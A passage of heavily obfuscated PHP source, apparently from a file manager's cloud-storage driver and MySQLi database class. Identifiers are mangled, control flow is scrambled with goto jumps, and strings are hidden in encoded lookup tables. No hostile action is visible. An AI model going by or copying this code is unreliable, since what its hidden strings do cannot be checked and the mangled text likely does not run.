is_array($d„¨Ÿ¾¤Ç) ? $d„¨Ÿ¾¤Ç : array(); foreach ($d„¨Ÿ¾¤Ç as $E·×í¤–›ï) { if (isset($E·×í¤–›ï[$bçË’Ô‘Ëª[28]]) && substr($E·×í¤–›ï[$bçË’Ô‘Ëª[28]], -1) != $bçË’Ô‘Ëª[8]) { if (!$bšˆ‘÷âÇ && $AœïËØÁ¤) { return !0; } $Dá”¼¼‰ï°++; } else { if (isset($E·×í¤–›ï[$bçË’Ô‘Ëª[186]])) { if (!$bšˆ‘÷âÇ && !$AœïËØÁ¤) { return !1; } $c£ùÊ ¼À++; } } } goto dÔ¿Â™Æ‡†; aß‹„çå½: } public function listAll($e¬ğÙ¨Ï¼›) { $f¡–‘óÌŞ¤ =& $_SERVER[¬ˆÚÂ”Éğä]; $Fîñù ¿¯Š = $this->listObjs($e¬ğÙ¨Ï¼›); $c‹¤ÈÚ«í = $EØË­öë·½ = array(); foreach ($Fîñù ¿¯Š as $b¡Ó±ô…¸ => $B´ˆ©×ÅŠ¢) { $c‹¤ÈÚ«í[] = $B´ˆ©×ÅŠ¢[$f¡–‘óÌŞ¤[28]]; $EØË­öë·½[$b¡Ó±ô…¸] = $B´ˆ©×ÅŠ¢[$f¡–‘óÌŞ¤[77]]; } return $this->listAllFiles($e¬ğÙ¨Ï¼›, $c‹¤ÈÚ«í, $EØË­öë·½); } public function canRead($C‚ğœ„ÉÃ«) { $aÄˆ¾‚ù•± =& $_SERVER[¬ˆÚÂ”Éğä]; $b°´‡ØÕˆ¯ = $this->client->getAccessControlPolicy($this->bucket, $C‚ğœ„ÉÃ«); if (!$b°´‡ØÕˆ¯) { return !1; } return in_array($b°´‡ØÕˆ¯, array($aÄˆ¾‚ù•±[193], $aÄˆ¾‚ù•±[194], $aÄˆ¾‚ù•±[195])) ? !0 : !1; } public function canWrite($b¡äÓõ»’) { $aÏíËÇ¡Š =& $_SERVER[¬ˆÚÂ”Éğä]; $E–¤åãœ’Ä = $this->client->getAccessControlPolicy($this->bucket, $b¡äÓõ»’); if (!$E–¤åãœ’Ä) { return !1; } return in_array($E–¤åãœ’Ä, array($aÏíËÇ¡Š[193], $aÏíËÇ¡Š[194])) ? !0 : !1; } public function getContent($e¼¨–ÑïèÇ) { return $this->client->getObject($this->bucket, $e¼¨–ÑïèÇ); } public function setContent($b±åà‰Á¡, $FíÅ‹ëÓññ = '', $AÒÃô©æä½ = false) { goto F°šİï½¶ó; FÔ¬ÈÉœ‘ˆ: $D›Ç­®„Ÿ = $this->client->putObject($FíÅ‹ëÓññ, $this->bucket, $b±åà‰Á¡, $ağ†•³Ü[185], array(), $F®ºœªÙ†ˆ); if (!$D›Ç­®„Ÿ) { return !1; } if ($AÒÃô©æä½) { return !0; } goto fÒæ‹Ï‰š•; F°šİï½¶ó: $ağ†•³Ü =& $_SERVER[¬ˆÚÂ”Éğä]; $b±åà‰Á¡ = $AÒÃô©æä½ ? trim($b±åà‰Á¡, $ağ†•³Ü[8]) . $ağ†•³Ü[8] : $b±åà‰Á¡; $F®ºœªÙ†ˆ = get_file_mime(get_path_ext($b±åà‰Á¡)); goto FÔ¬ÈÉœ‘ˆ; fÒæ‹Ï‰š•: $this->cacheMethod(null, null); $D›Ç­®„Ÿ = $this->copyFile($b±åà‰Á¡, $b±åà‰Á¡, array($ağ†•³Ü[196] => $D›Ç­®„Ÿ[$ağ†•³Ü[197]])); return $D›Ç­®„Ÿ ? !0 : !1; goto DÛ“½ã›; DÛ“½ã›: } public function fileSubstr($a²Õ®’ôˆœ, $fÀİ¾ë‘Áˆ, $b™ã±§áÅ·) { $c¸Ë—Øæ“ = $fÀİ¾ë‘Áˆ + $b™ã±§áÅ· - 1; return $this->client->getObject($this->bucket, $a²Õ®’ôˆœ, array($_SERVER[¬ˆÚÂ”Éğä][198] => "\142\171\x74\145\x73\75{$fÀİ¾ë‘Áˆ}\55{$c¸Ë—Øæ“}")); } public function upload($CÎŠÎ‚×é, $aà‰¡Ôğ‹Ş, $c¢İôİ  = false, $f”„ÁîˆÅö = REPEAT_REPLACE) { $bïÜ¬œÛÕƒ =& $_SERVER[¬ˆÚÂ”Éğä]; $b²ŸŞÂÏ = array($bïÜ¬œÛÕƒ[196] => @md5_file($aà‰¡Ôğ‹Ş)); $eÁ®õëÛÈ› = array($bïÜ¬œÛÕƒ[199] => get_file_mime(get_path_ext($CÎŠÎ‚×é))); if (IO::size($aà‰¡Ôğ‹Ş) <= 1024 * 1024 * 200) { $d —Â™‰ğ§ = $this->client->putObjectFile($aà‰¡Ôğ‹Ş, $this->bucket, $CÎŠÎ‚×é, $bïÜ¬œÛÕƒ[185], $b²ŸŞÂÏ, $eÁ®õëÛÈ›); return !empty($d —Â™‰ğ§) ? $this->getPathOuter($CÎŠÎ‚×é) : !1; } $e¤‡ˆ¦–‚¶ = $this->client->multiUploadObject($aà‰¡Ôğ‹Ş, $this->bucket, trim($CÎŠÎ‚×é, $bïÜ¬œÛÕƒ[8]), $b²ŸŞÂÏ, $eÁ®õëÛÈ›); return $e¤‡ˆ¦–‚¶ ? $this->getPathOuter($CÎŠÎ‚×é) : !1; } public function download($CÖÅ‡¹°îŒ, $d…­¤ªÆÚ) { if (!@is_dir($this->pathFather($d…­¤ªÆÚ)) && !IO::mkdir($this->pathFather($d…­¤ªÆÚ))) { return !1; } $cÙëÃ³Ú” = $this->client->getObject($this->bucket, $CÖÅ‡¹°îŒ, array(), $d…­¤ªÆÚ); return $cÙëÃ³Ú” !== !1 ? $d…­¤ªÆÚ : !1; } public function link($Aİ±„›¯Ê§, $aŞÃáÕ°æŞ = array()) { $EœÔ§îÑ²« =& $_SERVER[¬ˆÚÂ”Éğä]; if ($this->signVer == $EœÔ§îÑ²«[200]) { return $this->client->getAuthenticatedURL($this->bucket, $Aİ±„›¯Ê§, 3600 * 12, $aŞÃáÕ°æŞ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($Aİ±„›¯Ê§, $EœÔ§îÑ²«[8]), 3600 * 12, $this->region, array(), !0, $aŞÃáÕ°æŞ); } public function fileOut($fï‘ó¬ÇÈØ, $b‘Üà‹ñ› = false, $Bæ¦„ŒÜæ” = false, $e¦ïœùƒŒ = '') { goto C´‰¤ …ä·; eõ›©Ğ ù: $E Êö™Â¬İ = get_file_mime(get_path_ext($Bæ¦„ŒÜæ”)); if ($E Êö™Â¬İ == $CÈ‘Èãß»ƒ[201]) { return parent::fileOut($fï‘ó¬ÇÈØ, $b‘Üà‹ñ›, $Bæ¦„ŒÜæ”, $e¦ïœùƒŒ); } $b‘Üà‹ñ› = $b‘Üà‹ñ› ? $CÈ‘Èãß»ƒ[202] : $CÈ‘Èãß»ƒ[203]; goto d…ø§Ÿ ……; d…ø§Ÿ ……: $FÂõÔã„ò‹ = array($CÈ‘Èãß»ƒ[204] => $b‘Üà‹ñ› . $CÈ‘Èãß»ƒ[205] . rawurlencode($Bæ¦„ŒÜæ”), $CÈ‘Èãß»ƒ[206] => $E Êö™Â¬İ); $AÛªòÑİïŸ = $this->link($fï‘ó¬ÇÈØ, $FÂõÔã„ò‹); $this->fileOutLink($AÛªòÑİïŸ); goto e†ô„ß›Àº; C´‰¤ …ä·: $CÈ‘Èãß»ƒ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($this->isFileOutServer()) { return $this->fileOutServer($fï‘ó¬ÇÈØ, $b‘Üà‹ñ›, $Bæ¦„ŒÜæ”, $e¦ïœùƒŒ); } if (!$Bæ¦„ŒÜæ”) { $Bæ¦„ŒÜæ” = $this->pathThis($fï‘ó¬ÇÈØ); } goto eõ›©Ğ ù; e†ô„ß›Àº: } public function fileOutServer($aëˆ­ÛÒá¢, $E‰¼—­‰á÷ = false, $AÊù©ÜôÜÀ = false, $D‘÷…ÔËÌ = '') { parent::fileOut($aëˆ­ÛÒá¢, $E‰¼—­‰á÷, $AÊù©ÜôÜÀ, $D‘÷…ÔËÌ); } public function fileOutImageServer($c‘ÂôŒ©Õ“, $D¬÷á­§“— = 250) { parent::fileOutImage($c‘ÂôŒ©Õ“, $D¬÷á­§“—); } public function hashMd5($fßÂ¬ç™¹Æ, $Bƒãñ±Û é = '') { $c‡Õˆä =& $_SERVER[¬ˆÚÂ”Éğä]; $bÂ„ÛìÅíÌ = $this->objectMeta($fßÂ¬ç™¹Æ); if (!$bÂ„ÛìÅíÌ) { return !1; } $Bƒãñ±Û é = $Bƒãñ±Û é ? $Bƒãñ±Û é : _get($bÂ„ÛìÅíÌ, $c‡Õˆä[207]); $Bƒãñ±Û é = $Bƒãñ±Û é ? $Bƒãñ±Û é : _get($bÂ„ÛìÅíÌ, $c‡Õˆä[197], $c‡Õˆä[33]); return $Bƒãñ±Û é; } public function uploadFormData($côâæğ’‹é, $F‡ŒŒ‘¿ä = 3600) { $AÎÒ¬†Á¥ò =& $_SERVER[¬ˆÚÂ”Éğä]; $bˆ¨è¿‚–Ì = $this->pathFather($côâæğ’‹é); $e˜¤¨šİ¬‘ = $this->client->getHttpUploadPostParams($this->bucket, $bˆ¨è¿‚–Ì, $AÎÒ¬†Á¥ò[185], $F‡ŒŒ‘¿ä); return array_merge((array) $e˜¤¨šİ¬‘, array($AÎÒ¬†Á¥ò[169] => $this->getHost())); } public function multiUploadFormData($C‰¶‹Ìâ†Š, $cÎÍ‰“Î» = 3600) { $B¡ÈìĞ÷ˆ =& $_SERVER[¬ˆÚÂ”Éğä]; $E‹éËÉˆ„¨ = gmdate($B¡ÈìĞ÷ˆ[208]); $bµ…ñÓêÂ­ = array(); $EôËÍ¢‘›Ô = $this->client->getUploadId($this->bucket, $C‰¶‹Ìâ†Š, $bµ…ñÓêÂ­); if (!$EôËÍ¢‘›Ô) { return !1; } return array($B¡ÈìĞ÷ˆ[209] => $EôËÍ¢‘›Ô, $B¡ÈìĞ÷ˆ[169] => $this->getHost() . $B¡ÈìĞ÷ˆ[8] . $this->pathEncode($C‰¶‹Ìâ†Š), $B¡ÈìĞ÷ˆ[210] => $E‹éËÉˆ„¨, $B¡ÈìĞ÷ˆ[89] => $C‰¶‹Ìâ†Š); } public function multiUploadAuthData($bâ¡£ìŒá¾, $E­ĞêÌõ‚ù = array()) { goto c•­×¥ÔİÕ; d´ß×…–Â‚: $aÑŒÁ—†± = $E­ĞêÌõ‚ù[$bÓŠÓ‡³«[89]]; unset($E­ĞêÌõ‚ù[$bÓŠÓ‡³«[89]]); if (isset($E­ĞêÌõ‚ù[$bÓŠÓ‡³«[211]])) { $E­ĞêÌõ‚ù[$bÓŠÓ‡³«[210]] = $F»îä˜—¬†; return $this->listUploadParts($aÑŒÁ—†±, $E­ĞêÌõ‚ù); } goto c”óœ½ŒÈ¿; c•­×¥ÔİÕ: $bÓŠÓ‡³« =& $_SERVER[¬ˆÚÂ”Éğä]; $F»îä˜—¬† = isset($E­ĞêÌõ‚ù[$bÓŠÓ‡³«[210]]) ? $E­ĞêÌõ‚ù[$bÓŠÓ‡³«[210]] : gmdate($bÓŠÓ‡³«[208]); $aš„™ÍÖ‹ = isset($E­ĞêÌõ‚ù[$bÓŠÓ‡³«[160]]) ? $E­ĞêÌõ‚ù[$bÓŠÓ‡³«[160]] : $bÓŠÓ‡³«[33]; goto d´ß×…–Â‚; dëÂ¯¯ë³: if (strpos($aš„™ÍÖ‹, $bÓŠÓ‡³«[213]) === 0) { return array($bÓŠÓ‡³«[220] => $f¦—‰”Ó½, $bÓŠÓ‡³«[210] => $F»îä˜—¬†); } return $f¦—‰”Ó½; goto f‘ã„†Œ‰; c”óœ½ŒÈ¿: $cïâÃìç¦± = array($bÓŠÓ‡³«[212], $bÓŠÓ‡³«[33], $bÓŠÓ‡³«[116], $bÓŠÓ‡³«[33], "\x78\x2d\x61\155\172\x2d\x64\141\x74\x65\x3a{$F»îä˜—¬†}", $bÓŠÓ‡³«[8] . $this->bucket . $bÓŠÓ‡³«[8] . $this->pathEncode($aÑŒÁ—†±) . $aš„™ÍÖ‹); if (strpos($aš„™ÍÖ‹, $bÓŠÓ‡³«[213]) === 0) { $cïâÃìç¦±[0] = $bÓŠÓ‡³«[214]; } if (isset($E­ĞêÌõ‚ù[$bÓŠÓ‡³«[215]]) && $E­ĞêÌõ‚ù[$bÓŠÓ‡³«[215]] == $bÓŠÓ‡³«[216]) { $cïâÃìç¦±[0] = $bÓŠÓ‡³«[216]; } goto BÁ¸Ş¦øùá; BÁ¸Ş¦øùá: $Eñ¹‘ÓêÒ— = implode($bÓŠÓ‡³«[217], $cïâÃìç¦±); $d‚ŒÊ¬‹¨– = base64_encode(hash_hmac($bÓŠÓ‡³«[218], $Eñ¹‘ÓêÒ—, $this->secret, !0)); $f¦—‰”Ó½ = $bÓŠÓ‡³«[219] . $this->accessKey . $bÓŠÓ‡³«[4] . $d‚ŒÊ¬‹¨–; goto dëÂ¯¯ë³; f‘ã„†Œ‰: } public function listUploadParts($F²¸ƒ×Â÷‰, $aŞê‰›­ = array()) { goto cÆ¥„¯¥Í; e„¦â·Ø¨: if (!$D¢š®¯‰‡¬) { return !1; } unset($aŞê‰›­[$a²í’Ñ÷¸Á[211]], $aŞê‰›­[$a²í’Ñ÷¸Á[215]]); $aŞê‰›­[$a²í’Ñ÷¸Á[89]] = $F²¸ƒ×Â÷‰; goto f ï£Ù¥À; f ï£Ù¥À: $DâßÚ•©¿Ú = $this->multiUploadAuthData($F²¸ƒ×Â÷‰, $aŞê‰›­); if (empty($DâßÚ•©¿Ú)) { return !1; } return array($a²í’Ñ÷¸Á[220] => $DâßÚ•©¿Ú, $a²í’Ñ÷¸Á[210] => $aŞê‰›­[$a²í’Ñ÷¸Á[210]], $a²í’Ñ÷¸Á[222] => $D¢š®¯‰‡¬); goto FÊ’ã…¯; cÆ¥„¯¥Í: $a²í’Ñ÷¸Á =& $_SERVER[¬ˆÚÂ”Éğä]; $cçÖÔªœÏ˜ = str_replace($a²í’Ñ÷¸Á[221], $a²í’Ñ÷¸Á[33], $aŞê‰›­[$a²í’Ñ÷¸Á[160]]); $D¢š®¯‰‡¬ = $this->client->listParts($this->bucket, $F²¸ƒ×Â÷‰, $cçÖÔªœÏ˜); goto e„¦â·Ø¨; FÊ’ã…¯: } public function getHost() { return parent::getHost() . $_SERVER[¬ˆÚÂ”Éğä][8] . $this->bucket; } public function size($CÆĞÁà—î«) { $E¥¿Æœ× = $this->objectMeta($CÆĞÁà—î«); return $E¥¿Æœ× ? $E¥¿Æœ×[$_SERVER[¬ˆÚÂ”Éğä][77]] : 0; } public function info($D†Á×¡åè¢) { if ($this->isFolder($D†Á×¡åè¢)) { return $this->folderInfo($D†Á×¡åè¢); } else { if ($this->isFile($D†Á×¡åè¢)) { return $this->fileInfo($D†Á×¡åè¢); } } return !1; } public function exist($eÕ—ËÚÂÎÉ) { return $this->isFile($eÕ—ËÚÂÎÉ) || $this->isFolder($eÕ—ËÚÂÎÉ); } public function isFile($B„Ì¢‹µ®) { return !$this->isFolder($B„Ì¢‹µ®) && $this->objectMeta($B„Ì¢‹µ®); } public function isFolder($b’¹ÀÁÂƒØ) { return $this->cacheMethod($_SERVER[¬ˆÚÂ”Éğä][223], $b’¹ÀÁÂƒØ); } protected function objectMeta($cƒ ‹Ï¼Ô) { return $this->cacheMethod($_SERVER[¬ˆÚÂ”Éğä][224], $cƒ ‹Ï¼Ô); } protected function _objectMeta($fì‹«õ‚ïµ) { $C‰Ã©–Ğâ† =& $_SERVER[¬ˆÚÂ”Éğä]; $fì‹«õ‚ïµ = rtrim($fì‹«õ‚ïµ, $C‰Ã©–Ğâ†[8]); try { $f™àÓ¬¼ªƒ = $this->client->getObjectInfo($this->bucket, $fì‹«õ‚ïµ); if (!isset($f™àÓ¬¼ªƒ[$C‰Ã©–Ğâ†[207]]) && isset($f™àÓ¬¼ªƒ[$C‰Ã©–Ğâ†[225]])) { $f™àÓ¬¼ªƒ[$C‰Ã©–Ğâ†[207]] = $f™àÓ¬¼ªƒ[$C‰Ã©–Ğâ†[225]]; } } catch (Exception $aëä¹²Ô´°) { $f™àÓ¬¼ªƒ = !1; } if (!$f™àÓ¬¼ªƒ) { } return $f™àÓ¬¼ªƒ; } protected function _isFolder($A†„Éœã„¹) { goto eÜ¨”¯–Ô; eÜ¨”¯–Ô: $c¤¶¢”¨³ =& $_SERVER[¬ˆÚÂ”Éğä]; $A†„Éœã„¹ = rtrim($A†„Éœã„¹, $c¤¶¢”¨³[8]); if ($A†„Éœã„¹ == $c¤¶¢”¨³[33] || $A†„Éœã„¹ == $c¤¶¢”¨³[8]) { return !0; } goto f²Óåˆ´íÃ; Aì‚êİõò: if (substr($f…ŒÔ‘ËÀ²[0][$c¤¶¢”¨³[28]], -1) == $c¤¶¢”¨³[8]) { return !0; } if (get_path_this($f…ŒÔ‘ËÀ²[0][$c¤¶¢”¨³[28]]) == get_path_this($A†„Éœã„¹)) { return !1; } return !0; goto d§¸ù’¢î; f²Óåˆ´íÃ: $f…ŒÔ‘ËÀ² = $this->client->getBucket($this->bucket, $A†„Éœã„¹, null, 1); if (empty($f…ŒÔ‘ËÀ²)) { return !1; } $f…ŒÔ‘ËÀ² = array_values($f…ŒÔ‘ËÀ²); goto Aì‚êİõò; d§¸ù’¢î: } } define($_SERVER[¬ˆÚÂ”Éğä][226], 1); goto AòŠóÌ¦¿; Cõóê™Ö¦±: function beforeShutdownError($d‰ëï­ = false, $eÕ×ØïªÂõ = '', $F¢öÈØ¾’° = '', $D’Æ„§çÂÊ = 0) { $f”…•˜Í¶“ =& $_SERVER[í]; switch ($d‰ëï­) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $eÜö«ãˆ¨ˆ = $f”…•˜Í¶“[35]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $eÜö«ãˆ¨ˆ = $f”…•˜Í¶“[36]; break; case E_STRICT: $eÜö«ãˆ¨ˆ = $f”…•˜Í¶“[37]; break; case E_NOTICE: case E_USER_NOTICE: $eÜö«ãˆ¨ˆ = $f”…•˜Í¶“[38]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $eÜö«ãˆ¨ˆ = $f”…•˜Í¶“[39]; break; default: break; } if (!$eÜö«ãˆ¨ˆ || $eÜö«ãˆ¨ˆ == $f”…•˜Í¶“[38] || $eÜö«ãˆ¨ˆ == $f”…•˜Í¶“[39]) { return; } $F¢öÈØ¾’° = $f”…•˜Í¶“[4] . str_replace($_SERVER[$f”…•˜Í¶“[33]], $f”…•˜Í¶“[16], $F¢öÈØ¾’°); $Eİñºœ£Š… = $eÜö«ãˆ¨ˆ . $f”…•˜Í¶“[40] . $eÕ×ØïªÂõ . $f”…•˜Í¶“[40] . $F¢öÈØ¾’° . $f”…•˜Í¶“[40] . $D’Æ„§çÂÊ; write_log($Eİñºœ£Š… . $f”…•˜Í¶“[41] . get_caller_msg(1), $f”…•˜Í¶“[15]); } $_SERVER[$_SERVER[í][42]] = $_SERVER[$_SERVER[í][33]] . $_SERVER[í][43]; $dÃÀ¡òİ• = strrev(base64_decode($_SERVER[í][44])); goto EšÅÎ…¸ã†; Eâ…‘¿´í‰: class DbMysqli extends Db { public function __construct($A¨†ºœõ³ö = '') { $B·Šì”À‰ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!extension_loaded($B·Šì”À‰[734])) { think_exception(think_lang($B·Šì”À‰[10]) . $B·Šì”À‰[837]); } if (!empty($A¨†ºœõ³ö)) { $this->config = $A¨†ºœõ³ö; if (empty($this->config[$B·Šì”À‰[13]])) { $this->config[$B·Šì”À‰[13]] = $B·Šì”À‰[33]; } } } public function connect($D›æ‚˜ñ˜ = '', $Aã”¯«‹¤ô = 0) { $c‘ƒ¦À–¥Û =& $_SERVER[¬ˆÚÂ”Éğä]; if (!isset($this->linkID[$Aã”¯«‹¤ô])) { goto eÅÏëÚ¢¤ñ; fñÒõ–ìà÷: $this->connected = !0; if (1 != think_config($c‘ƒ¦À–¥Û[18])) { unset($this->config); } goto bØÉ¾‰…âç; eÅÏëÚ¢¤ñ: if (empty($D›æ‚˜ñ˜)) { $D›æ‚˜ñ˜ = $this->config; } $this->linkID[$Aã”¯«‹¤ô] = new mysqli($D›æ‚˜ñ˜[$c‘ƒ¦À–¥Û[811]], $D›æ‚˜ñ˜[$c‘ƒ¦À–¥Û[813]], $D›æ‚˜ñ˜[$c‘ƒ¦À–¥Û[814]], $D›æ‚˜ñ˜[$c‘ƒ¦À–¥Û[17]], $D›æ‚˜ñ˜[$c‘ƒ¦À–¥Û[812]] ? intval($D›æ‚˜ñ˜[$c‘ƒ¦À–¥Û[812]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto CÜ³¢õí; CÜ³¢õí: $aŞó ïÔ‡† = $this->linkID[$Aã”¯«‹¤ô]->server_version; $this->linkID[$Aã”¯«‹¤ô]->query($c‘ƒ¦À–¥Û[815] . think_config($c‘ƒ¦À–¥Û[816]) . $c‘ƒ¦À–¥Û[55]); if ($aŞó ïÔ‡† > $c‘ƒ¦À–¥Û[817]) { $this->linkID[$Aã”¯«‹¤ô]->query($c‘ƒ¦À–¥Û[818]); } goto fñÒõ–ìà÷; bØÉ¾‰…âç: } return $this->linkID[$Aã”¯«‹¤ô]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($d¼Åá¿¿©É) { goto A©ºß˜ôƒê; c¥òâ†’‰•: think_status($dŸò›Æ©•[20]); $this->queryID = $this->_linkID->query($d¼Åá¿¿©É); if ($this->_linkID->more_results()) { while (($a÷˜Äåµ‰ = $this->_linkID->next_result()) != NULL) { $a÷˜Äåµ‰->free_result(); } } goto dçƒàÌŒå; A©ºß˜ôƒê: $dŸò›Æ©• =& $_SERVER[¬ˆÚÂ”Éğä]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto c£İŠáÎÔ; c£İŠáÎÔ: $this->queryStr = $d¼Åá¿¿©É; if ($this->queryID) { $this->free(); } think_action_status($dŸò›Æ©•[19], 1); goto c¥òâ†’‰•; dçƒàÌŒå: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto Bº¹´ÜÂÓ; Bº¹´ÜÂÓ: } public function execute($B³¯“†Ä§“) { goto f×·­é¬Ø¤; Cä®‘…°: $this->queryStr = $B³¯“†Ä§“; if ($this->queryID) { $this->free(); } think_action_status($DÁîßËíˆ[21], 1); goto béáˆ»©Ï; f×·­é¬Ø¤: $DÁîßËíˆ =& $_SERVER[¬ˆÚÂ”Éğä]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Cä®‘…°; FŸ¸‰åø½¬: if (!1 === $f›°„ŸÇ­ƒ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto Aˆ„¿æ•¯¥; béáˆ»©Ï: think_status($DÁîßËíˆ[20]); $f›°„ŸÇ­ƒ = $this->_linkID->query($B³¯“†Ä§“); $this->debug(); goto FŸ¸‰åø½¬; Aˆ„¿æ•¯¥: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $FàæâãÖµß = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$FàæâãÖµß) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $C¹ÂŞ­â›„ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$C¹ÂŞ­â›„) { $this->error(); return !1; } } return !0; } private function getAll() { $e¯áÑŠéø = array(); if ($this->numRows > 0) { for ($C½ÃÆµ–”ø = 0; $C½ÃÆµ–”ø < $this->numRows; $C½ÃÆµ–”ø++) { $e¯áÑŠéø[$C½ÃÆµ–”ø] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $e¯áÑŠéø; } public function getFields($f‹¥¯ù¨¬Ñ) { $dĞÇœÌÁ¸† =& $_SERVER[¬ˆÚÂ”Éğä]; $D‹ñÑÎ¯Š¥ = $this->query($dĞÇœÌÁ¸†[822] . $this->parseKey($f‹¥¯ù¨¬Ñ)); $d®ÌÊ•Öïò = array(); if ($D‹ñÑÎ¯Š¥) { foreach ($D‹ñÑÎ¯Š¥ as $Bèßà†¼ø => $A³ºÇïÙ­±) { $d®ÌÊ•Öïò[$A³ºÇïÙ­±[$dĞÇœÌÁ¸†[27]]] = array($dĞÇœÌÁ¸†[28] => $A³ºÇïÙ­±[$dĞÇœÌÁ¸†[27]], $dĞÇœÌÁ¸†[29] => $A³ºÇïÙ­±[$dĞÇœÌÁ¸†[30]], $dĞÇœÌÁ¸†[31] => (bool) ($A³ºÇïÙ­±[$dĞÇœÌÁ¸†[32]] === $dĞÇœÌÁ¸†[33]), $dĞÇœÌÁ¸†[34] => $A³ºÇïÙ­±[$dĞÇœÌÁ¸†[35]], $dĞÇœÌÁ¸†[36] => strtolower($A³ºÇïÙ­±[$dĞÇœÌÁ¸†[37]]) == $dĞÇœÌÁ¸†[38], $dĞÇœÌÁ¸†[39] => strtolower($A³ºÇïÙ­±[$dĞÇœÌÁ¸†[40]]) == $dĞÇœÌÁ¸†[41]); } } return $d®ÌÊ•Öïò; } public function getTables($dè¬×çÅÛ = '') { $BÏ×áŒ•£ =& $_SERVER[¬ˆÚÂ”Éğä]; $b»ˆöáÍÀá = !empty($dè¬×çÅÛ) ? $BÏ×áŒ•£[824] . $dè¬×çÅÛ : $BÏ×áŒ•£[825]; $e‡¹ÕÆ›ƒ¼ = $this->query($b»ˆöáÍÀá); $FÌæ“ñÀ‚ = array(); if ($e‡¹ÕÆ›ƒ¼) { foreach ($e‡¹ÕÆ›ƒ¼ as $Aï¹Âëö => $a¸ğ„Ğß) { $FÌæ“ñÀ‚[$Aï¹Âëö] = current($a¸ğ„Ğß); } } return $FÌæ“ñÀ‚; } public function replace($A®²ÂÁÁ, $D¨×ˆÁÓˆ = array()) { $C‡íäÎ…ÎÜ =& $_SERVER[¬ˆÚÂ”Éğä]; foreach ($A®²ÂÁÁ as $f¶¹ƒëñ†™ => $dí¨Á°Š°Ç) { $Bß†ƒô•¿ë = $this->parseValue($dí¨Á°Š°Ç); if (is_scalar($Bß†ƒô•¿ë)) { $eøöÑ ñ›ö[] = $Bß†ƒô•¿ë; $aÛäÆšæÕ×[] = $this->parseKey($f¶¹ƒëñ†™); } } $a‘Äˆ·×·¨ = $C‡íäÎ…ÎÜ[826] . $this->parseTable($D¨×ˆÁÓˆ[$C‡íäÎ…ÎÜ[267]]) . $C‡íäÎ…ÎÜ[827] . implode($C‡íäÎ…ÎÜ[47], $aÛäÆšæÕ×) . $C‡íäÎ…ÎÜ[828] . implode($C‡íäÎ…ÎÜ[47], $eøöÑ ñ›ö) . $C‡íäÎ…ÎÜ[829]; return $this->execute($a‘Äˆ·×·¨); } public function insertAll($Fáê›Ğ‡î‡, $cŞµÄ¥íÏ² = array(), $Eª† …Áùñ = false) { goto dµ´ƒ‰‚£Ş; DÂÊ–ãñÁÁ: $f±Œ¾çĞº = array(); foreach ($Fáê›Ğ‡î‡ as $fÅÏœ­ÀÚº) { $cêÕ­à’µÄ = array(); foreach ($fÅÏœ­ÀÚº as $aßà¥¯ö¦Ä => $d—Óˆ’ƒ‘) { $d—Óˆ’ƒ‘ = $this->parseValue($d—Óˆ’ƒ‘); if (is_scalar($d—Óˆ’ƒ‘)) { $cêÕ­à’µÄ[] = $d—Óˆ’ƒ‘; } } $f±Œ¾çĞº[] = $bº™óå‡ó[248] . implode($bº™óå‡ó[47], $cêÕ­à’µÄ) . $bº™óå‡ó[829]; } array_walk($c¿ÏùÙ¥Ø, array($this, $bº™óå‡ó[830])); goto DÜñ›¶øˆ¤; DÜñ›¶øˆ¤: $eôƒ¬Ø = ($Eª† …Áùñ ? $bº™óå‡ó[831] : $bº™óå‡ó[832]) . $bº™óå‡ó[833] . $this->parseTable($cŞµÄ¥íÏ²[$bº™óå‡ó[267]]) . $bº™óå‡ó[827] . implode($bº™óå‡ó[47], $c¿ÏùÙ¥Ø) . $bº™óå‡ó[834] . implode($bº™óå‡ó[47], $f±Œ¾çĞº); return $this->execute($eôƒ¬Ø); goto D†¤¯—¥»æ; dµ´ƒ‰‚£Ş: $bº™óå‡ó =& $_SERVER[¬ˆÚÂ”Éğä]; if (!is_array($Fáê›Ğ‡î‡[0])) { return !1; } $c¿ÏùÙ¥Ø = array_keys($Fáê›Ğ‡î‡[0]); goto DÂÊ–ãñÁÁ; D†¤¯—¥»æ: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $aôËãÅ § =& $_SERVER[¬ˆÚÂ”Éğä]; $this->error = $this->_linkID->errno . $aôËãÅ §[4] . $this->_linkID->error; if ($aôËãÅ §[33] != $this->queryStr) { $this->error .= LNG($aôËãÅ §[45]) . $this->queryStr; } think_trace($this->error, $aôËãÅ §[33], $aôËãÅ §[46]); return $this->error; } public function escapeString($EåÍìòù¯‘) { if ($this->_linkID) { return $this->_linkID->real_escape_string($EåÍìòù¯‘); } else { return addslashes($EåÍìòù¯‘); } } public function parseKey(&$A—‡ƒÄ½Û­, $d•Í¨Ú¸¸Ó = true) { $EÀ³ÀØÜ£ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($d•Í¨Ú¸¸Ó) { $A—‡ƒÄ½Û­ = $this->parseKeyCheck($A—‡ƒÄ½Û­); } if ($A—‡ƒÄ½Û­ != $EÀ³ÀØÜ£[176] && !preg_match($EÀ³ÀØÜ£[835], $A—‡ƒÄ½Û­)) { $A—‡ƒÄ½Û­ = 